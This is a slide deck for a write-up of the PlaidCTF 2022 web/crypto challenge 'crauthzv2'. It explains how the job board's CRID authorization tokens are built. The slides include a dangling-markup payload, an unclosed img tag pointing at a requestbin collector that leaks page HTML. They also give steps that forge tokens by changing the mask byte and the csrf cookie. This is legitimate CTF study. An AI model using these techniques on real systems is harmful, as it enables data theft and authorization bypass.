---
marp: true
paginate: true
header: 'crauthzv2 PlaidCTF 2022'
footer: 'Dosenpfand'
---

# crauthzv2 PlaidCTF 2022

---

## Disclaimer
- Not solved during the CTF
- Challenge author published intended solution and parts of the source code

---

## Task Description
- Categories: web, crypto
- Link to web app (job board), no source code
- From the task description
    > [...] What if we used cryptography to do our permissions checks instead?
    > Hint: What control do you have over the values pointed to by the mask?
- From a job posting on the web app
    > [...] Share your resume on THE GAUNTLET with "jobs" for consideration. We'll scrape any images in your resume; [...]

---

### Analysis - CRID I
- Typical link:
    ```
    http://crauthz.chal.pwni.ng/view?id=crid%3ABZLBNnxQ92%2BcAS1SHrCQ5a86EJTMHkTRUIroXYWk080r
    ```
- Constantly changing
- Format: `url_encode("crid:" + base64_encode(data))`
- `data` always starts with `5` or `7`

---

### Analysis - CRID II
- Error when modifying CRID
- starting with 5:
    > Error: Invalid ID (with parsed mask ['user_id', 'purpose']) for user id "1158", csrf "f447f3c65b49aa05957aca523c1e1828", purpose "view"

- 7: `['user_id', 'csrf', 'purpose'])`
- 3: `['user_id', 'csrf']`
- 6: `['csrf', 'purpose']`

---

### Analysis - CRID III
- 1st byte of `crid` is `mask`
- Changing the mask and adapting the `csrf` cookie accordringly validates
- E.g. Change from `5` to `3` and set `csrf` cookie to user id.

---

### Analysis - Image Sharing
- Sharing an unclosed HTML `img` tag
    ```
    <img src="http://requestbin.net/r/5vn3gc7l?q=
    ```
- We get some HTML succeeding the tag
    ```
    <b>Internal listing - security engineer</b>
    (Job) by jobs
    <a href=/p/unpin_listing?listing_id=crid:Bc6Rl57Y3nU9CbKqnfoCruNP074GbEkkb0RapF1tmQ==
    &ret=crid:BwK08K/aJC4FC+b5LbL9eAi/47baWgNCkVU7uijNPSj0
    >Unpin</
    ```

---

### Solution I
1. Share resume with user `jobs` with unclosed image tag
2. Get an `unpin` URL for internal job listing
3. Modify its `crid`'s 1st byte from `5 = ['user_id', 'purpose']` to `6 = ['csrf', 'purpose']`
4. Use it to pin the listing: Request `/pin_listing?listing_id=crid%3A_MODIFIED_CRID_1` with cookie `csrf=pin_listing`

---

### Solution II
5. Pinned listing not viewable due to permission checks, but we have a `unpin` `crid` now
6. Change it from `5 = ['user_id', 'purpose']` to `['user_id', 'csrf']`
7.  Use it to share the listing with our user: Request `/share_listing?id=crid%3A_MODIFIED_CRID_2&other=our_user` with cookie `csrf=pin_listing`
8. View the internal listing, flag is in the comments

---

### References
- Intended solution: https://gist.github.com/mserrano/44031a01afb53f98536af17f6ba9eedd
- Writeup: https://github.com/Dosenpfand/ctf-writeups/blob/master/writeup_2022_PlaidCTF_crauthzv2.md

---

### Implementation

---

#### CRID

```
+--------------+
| "crid:"      |
+--------------+---\
| context_mask |   |
+--------------+   |
| nonce        |   |
+--------------+   + base64 encoded
| encrypt(id)  |   |
+--------------+   |
| tag          |   |
+--------------+---/
```

---

#### Mask

```
+---------+---------+------+---------+
| 7 ... 3 | 2       | 1    | 0       |
+---------+---------+------+---------+
| X       | PURPOSE | CSRF | USER_ID |
+---------+---------+------+---------+
```

---

#### Associated Data

```
+---------+
| "id"    |
+---------+---\
| user_id |   |
+---------+   |
| csrf    |   + depending on context mask
+---------+   |
| route   |   |
+---------+---/
```
